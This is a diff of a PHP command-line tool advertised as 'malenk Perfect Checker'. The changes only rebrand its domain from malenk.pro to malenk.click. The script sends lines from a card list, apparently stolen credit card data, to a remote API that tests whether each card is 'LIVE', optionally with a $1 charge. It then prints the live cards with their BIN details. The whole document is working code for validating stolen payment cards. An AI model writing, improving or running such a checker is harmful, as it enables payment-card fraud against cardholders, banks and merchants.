@@ -1,8 +1,8 @@
 <?php
 /**
- * malenk.pro Perfect Checker
+ * malenk.click Perfect Checker
  * @version : 1.0
- * @author  : Malenk.pro
+ * @author  : Malenk.click
  * Have two type_check. charge 1$ (USD) and no charge version!
  * Input charge if you just want charge. Input random for random (charge or not)
  * Input anything/null if you just want non-charge type_check
@@ -16,7 +16,7 @@ if(!file_exists("config.json")) {
 }
 
 if(!file_exists("alerts.txt")) {
-    echo "Hello! Welcome to malenk.pro Checker! Please Update your config before run this source code!".PHP_EOL;
+    echo "Hello! Welcome to malenk.click Checker! Please Update your config before run this source code!".PHP_EOL;
     echo "Are you updated this config.json (y/N) ";
     $updated = trim(fgets(STDIN));
     if(strtolower($updated) == "y") {
@@ -33,7 +33,7 @@ if(!is_dir($readConfig['result_dir'])) {
 
 $i=0;
 do {
-    $isValidKeys = curl("https://malenk.pro/api/?version=1.0", json_encode(['type' => 'validate_userkey', 'data' => ['userkey' => $readConfig['userkey'] ]]));
+    $isValidKeys = curl("https://malenk.click/api/?version=1.0", json_encode(['type' => 'validate_userkey', 'data' => ['userkey' => $readConfig['userkey'] ]]));
     if(isJson($isValidKeys)) {
         if(json_decode($isValidKeys, true)['error'] == false) {
             echo "[-] Key is ".$colors->getColoredString("VALID").PHP_EOL;
@@ -88,7 +88,7 @@ $content = explode("\n", trim(file_get_contents($newPath)));
 $lineNow = 1;
 foreach($content as $format) {
     checking:
-    $check = curl("https://malenk.pro/api/?version=1.0", json_encode(['type' => 'check','data' => ['userkey' => $readConfig['userkey'], 'type_check' => $readConfig['type_check'], 'cclist' => trim($format)]]));
+    $check = curl("https://malenk.click/api/?version=1.0", json_encode(['type' => 'check','data' => ['userkey' => $readConfig['userkey'], 'type_check' => $readConfig['type_check'], 'cclist' => trim($format)]]));
     if(isJson($check)) {
         if(json_decode($check,1)['status'] == "LIVE") {
             echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".json_decode($check,1)['bin_info']." [".$colors->getColoredString("LIVE", "white", "green")."] [CREDIT : ".$colors->getColoredString(json_decode($check,1)['credit'], "white", "green")."] [Check Type : ".json_decode($check,1)['check_type']."]".PHP_EOL;
@@ -139,7 +139,7 @@ foreach($content as $format) {
     $lineNow++;
 }
 
-echo PHP_EOL.PHP_EOL."Checking Done! Powered by Malenk.pro - ".$colors->getColoredString("Perfect Checker", "green")." Site With Accuracy 100%!";
+echo PHP_EOL.PHP_EOL."Checking Done! Powered by Malenk.click - ".$colors->getColoredString("Perfect Checker", "green")." Site With Accuracy 100%!";
 
 function input($text) {
     echo $text.": ";
